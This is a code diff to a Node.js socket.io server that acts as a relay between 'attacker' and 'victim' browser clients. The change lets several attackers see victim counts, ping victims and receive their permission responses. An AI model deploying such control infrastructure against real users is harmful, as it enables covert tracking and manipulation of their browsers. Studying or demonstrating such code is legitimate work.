@@ -1,7 +1,6 @@
 const express = require('express');
 const app = express();
 const http = require('http');
-const { SocketAddress } = require('net');
 const server = http.createServer(app);
 const { Server } = require("socket.io");
 const io = new Server(server);
@@ -21,49 +20,55 @@ app.get('/a/a.js', (req, res) => {
   res.sendFile(__dirname + '/frontend/attacker/attacker.js');
 });
 
-let connections = 0;
-// TODO: add multiple attackers
-let attackerSocket = null;
+let victimConns = 0;
+let attackerConns = 0;
+let attackerSockets = [];
 
 io.on('connection', (socket) => {
   console.log('a user connected');
   socket.on('disconnect', () => {
     console.log('user disconnected');
     if (role == 'victim') {
-      connections--;
-      if (attackerSocket) {
-        attackerSocket.emit('connections', connections);
-      }
+      victimConns--;
+      attackerSockets.forEach((attackerSocket) => {
+        attackerSocket.emit('victims', victimConns);
+      });
     }
   });
   let role = null;
-  socket.on('role', (r) => {
-    console.log('role: ' + r);
-    role = r;
+  socket.on('conn', (msg) => {
+    role = msg.role;
 
     if (role == 'attacker') {
-      attackerSocket = socket;
-      socket.emit('connections', connections);
+      attackerConns++;
+      attackerSockets.push(socket);
+      socket.emit('victims', victimConns);
+      attackerSockets.forEach((attackerSocket) => {
+        attackerSocket.emit('attackers', attackerConns);
+      });
     }
     else if (role == 'victim') {
-      connections++;
-      if (attackerSocket) {
-        attackerSocket.emit('connections', connections);
-      }
+      victimConns++;
+      attackerSockets.forEach((attackerSocket) => {
+        attackerSocket.emit('victims', victimConns);
+      });
     }
+    attackerSockets.forEach((attackerSocket) => {
+      attackerSocket.emit('new-conn', msg);
+    });
   });
   socket.on('ping', () => {
     socket.broadcast.emit('ping');
   });
   socket.on('pong', () => {
-    if (attackerSocket) {
+    attackerSockets.forEach((attackerSocket) => {
       attackerSocket.emit('pong');
-    }
+    });
   });
   socket.on('permission', (msg) => {
-    if (attackerSocket) {
+    attackerSockets.forEach((attackerSocket) => {
       attackerSocket.emit('permission', msg);
-    }
+    });
   });
   socket.on('notification', (msg) => {
     socket.broadcast.emit('notification', msg);
